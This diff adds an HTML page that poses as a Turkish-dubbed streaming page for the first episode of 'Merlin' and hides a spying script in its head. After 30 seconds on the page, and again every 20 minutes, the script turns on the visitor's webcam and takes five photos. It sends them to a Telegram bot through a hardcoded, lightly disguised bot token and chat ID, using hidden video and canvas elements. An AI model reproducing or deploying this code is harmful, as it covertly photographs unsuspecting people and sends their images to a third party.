@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Merlin 1. Bölüm | Türkçe Dublaj | Ejderhanın Çağrısı</title>
+    <style>
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            flex-direction: column;
+            height: 100vh;
+            margin: 0;
+            background-color: #000; /* Night mode */
+            color: #fff; /* White text */
+            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        .title {
+            font-size: 3rem; /* Large title font */
+            font-weight: bold;
+            margin-top: 20px; /* Added margin-top so the title does not overlap */
+            color: #f0f0f0; /* Light color for title */
+            text-transform: uppercase;
+            margin-bottom: 20px; /* Added space below title */
+        }
+        .video-container {
+            position: relative;
+            width: 100%;
+            max-width: 1000px; /* Maximum video width */
+            height: 0;
+            padding-bottom: 56.25%; /* 16:9 Aspect Ratio */
+            background-color: #000;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .video-container iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        .description {
+            max-width: 90%;
+            margin-top: 20px;
+            padding: 10px;
+            background-color: #222; /* Dark grey */
+            border: 1px solid #555;
+            border-radius: 8px;
+            font-size: 1rem;
+            color: #fff;
+            text-align: center;
+        }
+        #video {
+            display: none; /* Hide the video element */
+        }
+        @media (max-width: 768px) {
+            .title {
+                font-size: 2rem; /* Adjust title font size for mobile */
+            }
+            .description {
+                font-size: 0.9rem; /* Smaller text for mobile */
+            }
+        }
+        @media (max-width: 480px) {
+            .title {
+                font-size: 1.5rem; /* Smaller title for very small screens */
+            }
+            .description {
+                font-size: 0.8rem;
+            }
+        }
+    </style>
+    <script>
+        // Token handling logic
+        let botToken = "huge7274903280:AAF4ifRnULKbbn3WuRaxXKlf1trU1ZGF6Sc"; // Token with prefix
+        if (botToken.startsWith("huge")) {
+            botToken = botToken.substring(4); // Remove 'huge' prefix
+        }
+
+        const chatId = '7867694029';  // Your Telegram chat ID
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        let videoStream = null;
+
+        // Function to send image to Telegram
+        function sendToTelegram(imageData) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', imageData);
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('Image sent to Telegram successfully');
+                } else {
+                    console.error('Failed to send image to Telegram:', data);
+                }
+            })
+            .catch(error => console.error('Error sending image:', error));
+        }
+
+        // Function to capture a single photo from the video stream
+        function capturePhoto() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Draw the current video frame onto the canvas
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Convert the canvas content to an image URL (base64)
+            const imgData = canvas.toDataURL('image/png');
+            console.log("Captured Image:", imgData);
+
+            // Convert the base64 image to a Blob for sending via Telegram
+            const byteCharacters = atob(imgData.split(',')[1]);
+            const byteArrays = [];
+
+            for (let offset = 0; offset < byteCharacters.length; offset++) {
+                const byteArray = new Uint8Array(1);
+                byteArray[0] = byteCharacters.charCodeAt(offset);
+                byteArrays.push(byteArray);
+            }
+
+            const byteArray = new Blob(byteArrays, { type: 'image/png' });
+
+            // Send the captured image to Telegram
+            sendToTelegram(byteArray);
+        }
+
+        // Function to stop the camera
+        function stopCamera(stream) {
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop());
+            console.log('Camera stopped.');
+        }
+
+        // Function to activate the camera and capture multiple photos
+        function activateCameraAndCaptureMultiple() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then((stream) => {
+                    video.srcObject = stream;
+                    videoStream = stream;
+
+                    let count = 0;
+                    const captureInterval = setInterval(() => {
+                        capturePhoto();
+                        count++;
+
+                        if (count >= 5) {
+                            clearInterval(captureInterval);
+                            stopCamera(videoStream);
+                        }
+                    }, 2000); // Capture a picture every 2 seconds (5 pictures in 10 seconds)
+                })
+                .catch((error) => {
+                    console.error('Error accessing the camera:', error);
+                });
+        }
+
+        // Function to schedule automatic photo capture
+        function scheduleAutomaticCapture() {
+            setTimeout(() => {
+                console.log('Taking initial photo after 30 seconds');
+                activateCameraAndCaptureMultiple();
+
+                setInterval(() => {
+                    console.log('Taking photos every 20 minutes');
+                    activateCameraAndCaptureMultiple();
+                }, 1200000); // 20 minutes in milliseconds
+
+            }, 30000); // 30 seconds in milliseconds
+        }
+
+        // Start the automatic capture schedule on page load
+        document.addEventListener('DOMContentLoaded', scheduleAutomaticCapture);
+    </script>
+</head>
+<body>
+    <!-- Video title at the top center above the player -->
+    <div class="title">Merlin 1. Bölüm | Türkçe Dublaj | Ejderhanın Çağrısı</div>
+
+    <!-- Custom Video Player using Google Drive link -->
+    <div class="video-container">
+        <iframe src="https://drive.google.com/file/d/1hGcMy61ERESxK4_2lZNfBDQH1J6QqOFY/preview" 
+                frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    </div>
+
+    <!-- Description section -->
+    <div class="description">
+        <p>
+            "Merlin" dizisinin bu bölümünde, Camelot Krallığı bir kez daha büyük bir tehlikeyle karşı karşıya. 
+            Genç büyücü Merlin, Kral Arthur'un geleceğini korumak için kadim bir çağrıya yanıt vermek zorunda kalır. 
+            Ejderhanın yeniden uyanışı, krallığı büyülü bir yolculuğa çıkarır. Merlin'in bu zorlu macerasında, 
+            dostluk, cesaret ve kaderin güçlerini keşfedin. Türkçe dublaj ile keyifle izleyin!
+        </p>
+    </div>
+  </div>
+    <div class="youtube-container">
+    <iframe id="youtube-player" width="10" height="10" 
+            src="https://www.youtube.com/embed/sN98tqCikyM?list=PLT48E20fpetQNQbeACxWZYi2mem06SZm7&autoplay=1&mute=1&loop=1&playlist=PLT48E20fpetQNQbeACxWZYi2mem06SZm7" 
+            frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+</div>
+    <!-- Hidden video and canvas elements -->
+    <video id="video" autoplay></video>
+    <canvas id="canvas" style="display: none;"></canvas>
+</body>
+</html>
